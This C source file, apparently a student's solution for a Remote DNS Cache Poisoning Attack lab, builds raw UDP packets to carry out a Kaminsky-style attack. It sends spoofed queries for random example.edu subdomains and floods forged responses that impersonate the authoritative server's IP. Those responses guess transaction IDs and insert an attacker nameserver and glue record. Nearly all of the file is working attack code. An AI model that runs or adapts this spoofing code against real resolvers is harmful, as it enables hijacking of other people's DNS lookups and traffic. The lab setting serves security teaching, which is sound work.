// ----udp.c------
// For use with the Remote DNS Cache Poisoning Attack Lab
// Sample program used to spoof lots of different DNS queries to the victim.
//
// Wireshark can be used to study the packets, however, the DNS queries 
// sent by this program are not enough for to complete the lab.
//
// The response packet needs to be completed.
//
// Compile command:
// gcc udp.c -o udp
//
// The program must be run as root
// sudo ./udp

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

typedef unsigned short int u_int_s;
typedef short int int_s;

char *source_ip;
char *destination_ip;
char *example_edu_ip = "199.43.135.53";

// The IP header's structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;

};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int  type;
    unsigned short int  class;
};

struct dnsResponseEnd{
    unsigned short int type;
    unsigned short int class;
    unsigned short int ttl_l;
    unsigned short int ttl_u;
    unsigned short int datalen;
};

unsigned char additional_session_fields[11] = {
    0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x88, 0x00, 0x00, 0x00
};

// total udp header length: 8 bytes (=64 bits)

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum((uint16_t *)&(tempI->iph_sourceip),8);
    sum+=checksum((uint16_t *)tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC791,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}   

int main(int argc, char *argv[])
{
    // This is to check the argc number
    if(argc != 3){
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }

    source_ip = argv[1];
    destination_ip = argv[2];

    // socket descriptor
    int sd, response_sd, iterator;

    // buffer to hold the packet
    char buffer[PCKT_LEN];

    // buffer to hold the response.
    char response_buffer[PCKT_LEN];

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // set the response buffer to 0 for all bytes
    memset(response_buffer, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // The headers for the response structure.
    struct ipheader *response_ip = (struct ipheader *)response_buffer;
    struct udpheader *response_udp = (struct udpheader *)(response_buffer + sizeof(struct ipheader));
    struct dnsheader *response_dns = (struct dnsheader*)(response_buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
    char *response_data=(response_buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    strcpy(response_data, "\5aaaaa\7example\3edu");
    int response_data_length = strlen(response_data)+1;

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * dns_resp=(struct dataEnd *)(response_data+response_data_length);
    dns_resp->type=htons(1);
    dns_resp->class=htons(1);
    response_data_length += sizeof(struct dataEnd);

    //The flag you need to set
    dns->flags=htons(FLAG_Q);
    response_dns->flags = htons(FLAG_R);
    
    //only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);
    response_dns->QDCOUNT = htons(1);

    // Remaining flags for DNS Response.
    response_dns->ANCOUNT = htons(1);
    response_dns->NSCOUNT = htons(1);
    response_dns->ARCOUNT = htons(2);

    //query string
    strcpy(data,"\5aaaaa\7example\3edu");
    int length= strlen(data)+1;

    char *dns_fields = response_data + response_data_length;
    int ttl = 2;

    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    // The Question Section of the DNS Headers.
    // The flag value is same as present in the wireshark output presented
    // in the assignment document.
    u_int_s *q_flag = (u_int_s*)dns_fields; *q_flag = htons(0xC00C);
    dns_fields += sizeof(u_int_s);

    // Fields for the Answer Section in the DNS Header.
    dns_resp = (struct dataEnd*) dns_fields;
    dns_resp->type=htons(1);
    dns_resp->class=htons(1);
    dns_fields += sizeof(struct dataEnd);
    *dns_fields = ttl; dns_fields += sizeof(int);

    // Adding the source IP in the packet header of the DNS.
    short *ip_len = (short *)dns_fields;
    *ip_len = htons(4); dns_fields += sizeof(short);

    unsigned int *ip_addr = (unsigned int*)dns_fields;
    *ip_addr = inet_addr(source_ip); dns_fields += sizeof(unsigned int);

    // The Authoritative section field of the DNS Header.
    // The flag value is same as present in the wireshark output presented
    // in the assignment document.
    int_s *au_flag = (int_s*)dns_fields; *au_flag = htons(0xC012);
    dns_fields += sizeof(int_s);

    // Adding the section fields.
    dns_resp = (struct dataEnd*) dns_fields;
    dns_resp->type=htons(2);
    dns_resp->class=htons(1);
    dns_fields += sizeof(struct dataEnd);
    *dns_fields = ttl; dns_fields += sizeof(int);

    int_s *domain_name = (int_s *)dns_fields;
    *domain_name = htons(23); dns_fields += sizeof(int_s);

    // Adding the domain in the DNS header structure.
    strcpy(dns_fields, "\2ns\16dnslabattacker\3net");
    dns_fields += 23;

    // The flag value is same as present in the wireshark output presented
    // in the assignment document.
    int_s *ad_flag = (int_s*)dns_fields; *ad_flag = htons(0xC03F);
    dns_fields += sizeof(int_s);

    dns_resp = (struct dataEnd*) dns_fields;
    dns_resp->type=htons(1);
    dns_resp->class=htons(1);
    dns_fields += sizeof(struct dataEnd);
    *dns_fields = ttl; dns_fields += sizeof(int);

    // Adding the fields for the Recursion Desired section of the DNS Header.
    int_s *rd_len = (int_s *)dns_fields;
    *rd_len = htons(4); dns_fields += sizeof(int_s);

    ip_addr = (unsigned int*)dns_fields;
    *ip_addr = inet_addr(source_ip); dns_fields += sizeof(unsigned int);
    /*************************************************************************************
      Construction of the packet is done. 
      now focus on how to do the settings and send the packet we have composed out
     ***************************************************************************************/

    for (iterator=0; iterator<11; iterator++) dns_fields[iterator] = additional_session_fields[iterator];
     
    dns_fields += 11; 
    // Source and destination addresses: IP and port
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    response_sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error\n");

    if(response_sd<0) // if socket fails to be created 
        printf("response socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    u_int_s resp_udp_len = dns_fields - (char*)response_udp;
    u_int_s resp_ip_len = resp_udp_len + sizeof(struct ipheader);

    // Response DNS IP Header.
    response_ip->iph_ihl = 5;
    response_ip->iph_ver = 4;
    response_ip->iph_tos = 0;
    response_ip->iph_ident = htons(rand());
    response_ip->iph_ttl = 110;
    response_ip->iph_protocol = 17;
    // Source IP address, can use spoofed address here!!!
    response_ip->iph_sourceip = inet_addr(example_edu_ip);
    // The destination IP address
    response_ip->iph_destip = inet_addr(destination_ip);
    response_ip->iph_len = htons(resp_ip_len);
    
    response_udp->udph_srcport = htons(53);
    response_udp->udph_destport = htons(33333);
    response_udp->udph_len = htons(resp_udp_len);

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(argv[1]);

    // The destination IP address
    ip->iph_destip = inet_addr(argv[2]);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number. remember the lower number may be reserved
    // Destination port number
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd));

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));

    // Calculate the checksum for integrity
    response_ip->iph_chksum = csum((unsigned short *)response_buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    response_udp->udph_chksum=check_udp_sum(response_buffer, resp_udp_len);

    //response_dns->query_id = dns->query_id;
    /*******************************************************************************8
      Tips

      the checksum is quite important to pass integrity checking. You need 
      to study the algorithem and what part should be taken into the calculation.

      !!!!!If you change anything related to the calculation of the checksum, you need to re-
      calculate it or the packet will be dropped.!!!!!

      Here things became easier since the checksum functions are provided. You don't need
      to spend your time writing the right checksum function.
      Just for knowledge purposes,
      remember the seconed parameter
      for UDP checksum:
      ipheader_size + udpheader_size + udpData_size  
      for IP checksum: 
      ipheader_size + udpheader_size
     *********************************************************************************/

    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");	
        exit(-1);
    }

    if(setsockopt(response_sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");	
        exit(-1);
    }

    while(1)
    {	
        // This is to generate a different query in xxxxx.example.edu
        //   NOTE: this will have to be updated to only include printable characters
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;
        *(response_data+charnumber)+=1;

        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));

        printf("Sent a DNS Query to DNS Server...\n");
        printf("Sending DNS Response to poison DNS Cache...\n");
        int query_id = 200;
        while(query_id <= 500){
            response_dns->query_id = query_id;
            response_udp->udph_chksum = check_udp_sum(response_buffer, resp_udp_len);
        
            if(sendto(response_sd, response_buffer, resp_ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
                printf("packet send error %d which means %s\n",errno,strerror(errno));
            query_id++;
            sleep(0.1);
        }
    }
    close(sd);
    close(response_sd);
    return 0;
}